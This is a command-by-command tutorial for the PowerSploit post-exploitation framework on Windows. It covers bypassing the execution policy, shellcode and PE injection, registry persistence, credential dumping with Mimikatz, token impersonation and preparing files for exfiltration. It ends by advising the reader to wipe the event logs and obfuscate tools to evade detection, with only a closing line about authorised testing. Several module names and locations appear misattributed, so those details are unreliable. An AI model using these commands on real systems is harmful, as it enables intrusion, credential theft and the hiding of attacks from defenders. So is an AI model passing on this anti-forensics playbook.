# Powersploit

### Prerequisites
1. **Windows Environment:** PowerSploit requires a Windows machine with PowerShell installed.
2. **Administrative Privileges:** Many of the scripts require administrative privileges to execute effectively.
3. **Execution Policy:** Ensure that the PowerShell execution policy allows script execution. Use the following command to bypass the execution policy:
   ```powershell
   Set-ExecutionPolicy Bypass -Scope Process -Force
   ```
4. **PowerSploit Repository:** Clone or download the PowerSploit repository from [GitHub](https://github.com/PowerShellMafia/PowerSploit).

### Step 1: Setting Up PowerSploit

1. **Download and Extract:**
   Download the PowerSploit repository:
   ```bash
   git clone https://github.com/PowerShellMafia/PowerSploit.git
   ```
   If Git is not available, download the ZIP file directly from GitHub and extract it.

2. **Load the Modules:**
   Navigate to the directory where PowerSploit was downloaded and import the modules you need. For example:
   ```powershell
   Import-Module ./PowerSploit/CodeExecution/Invoke-Shellcode.ps1
   ```

### Step 2: Using PowerSploit for Common Tasks

#### 1. **Code Execution:**
   PowerSploit offers several methods to execute arbitrary code on a target machine.

   - **Invoke-Shellcode:**
     This script injects shellcode directly into the memory of the current process or a remote process.
     ```powershell
     Import-Module ./PowerSploit/CodeExecution/Invoke-Shellcode.ps1
     Invoke-Shellcode -Shellcode (New-Object byte[] 300) -Force
     ```
     Replace `(New-Object byte[] 300)` with your own shellcode.

   - **Invoke-ReflectivePEInjection:**
     This script injects a PE file (like an EXE or DLL) into the memory of a process without writing it to disk.
     ```powershell
     Import-Module ./PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1
     Invoke-ReflectivePEInjection -PEPath "C:\path\to\your\file.exe" -ProcId 1234
     ```

#### 2. **Persistence:**
   PowerSploit includes several scripts to establish persistence on a compromised system.

   - **New-UserPersistenceOption:**
     This script creates various persistence options, such as adding registry keys, modifying startup scripts, or creating scheduled tasks.
     ```powershell
     Import-Module ./PowerSploit/Persistence/New-UserPersistenceOption.ps1
     New-UserPersistenceOption -Option "Registry" -UserName "targetuser"
     ```

   - **Invoke-EventVwrBypass:**
     This technique exploits the eventvwr.exe binary to gain persistence by setting the registry key to launch a custom executable.
     ```powershell
     Import-Module ./PowerSploit/Persistence/Invoke-EventVwrBypass.ps1
     Invoke-EventVwrBypass -Command "C:\path\to\your\payload.exe"
     ```

#### 3. **Reconnaissance:**
   Information gathering is critical during the post-exploitation phase.

   - **Invoke-HostRecon:**
     This script gathers extensive information about the host, including user accounts, network interfaces, and running processes.
     ```powershell
     Import-Module ./PowerSploit/Recon/Invoke-HostRecon.ps1
     Invoke-HostRecon
     ```

   - **Get-NetLocalGroup:**
     This script enumerates local groups on the target machine and their members.
     ```powershell
     Import-Module ./PowerSploit/Recon/PowerView.ps1
     Get-NetLocalGroup
     ```

#### 4. **Credential Dumping:**
   Extracting credentials is often a key objective in post-exploitation.

   - **Invoke-Mimikatz:**
     PowerSploit can integrate with Mimikatz to extract credentials from memory.
     ```powershell
     Import-Module ./PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
     Invoke-Mimikatz -DumpCreds
     ```

   - **Invoke-CredentialInjection:**
     Inject harvested credentials into the current session to impersonate another user.
     ```powershell
     Import-Module ./PowerSploit/Exfiltration/Invoke-CredentialInjection.ps1
     Invoke-CredentialInjection -Username "targetuser" -Password "password"
     ```

#### 5. **Exfiltration:**
   Exfiltrating data from a compromised system is often the final step in an attack.

   - **Invoke-TokenManipulation:**
     This script manipulates Windows tokens to steal or impersonate another user’s security context.
     ```powershell
     Import-Module ./PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1
     Invoke-TokenManipulation -ImpersonateUser -Username "Administrator"
     ```

   - **Out-EncryptedZip:**
     Compress and encrypt files for exfiltration.
     ```powershell
     Import-Module ./PowerSploit/Exfiltration/Out-EncryptedZip.ps1
     Out-EncryptedZip -FilePath "C:\path\to\exfiltrate" -Password "SuperSecretPassword" -OutPath "C:\output.zip"
     ```

### Step 3: Cleaning Up

After using PowerSploit, it's essential to clean up any traces left on the system to avoid detection.

1. **Remove Modules:**
   Unload any PowerSploit modules that were imported:
   ```powershell
   Remove-Module PowerSploit
   ```
2. **Delete Logs:**
   Clear event logs or other artifacts that may reveal your activities.

   - Clear logs:
     ```powershell
     wevtutil cl System
     wevtutil cl Security
     wevtutil cl Application
     ```

### Final Notes

- **Avoid Overuse:** Some PowerSploit modules, like `Invoke-Mimikatz`, are well-known and can be detected by modern antivirus and endpoint detection tools. Use obfuscation techniques to evade detection.
- **Update Regularly:** PowerSploit is a community-driven project. Ensure you are using the latest version to benefit from any improvements or new features.

PowerSploit is a powerful framework, but it should be used responsibly and ethically, only on systems where you have explicit permission to perform security testing.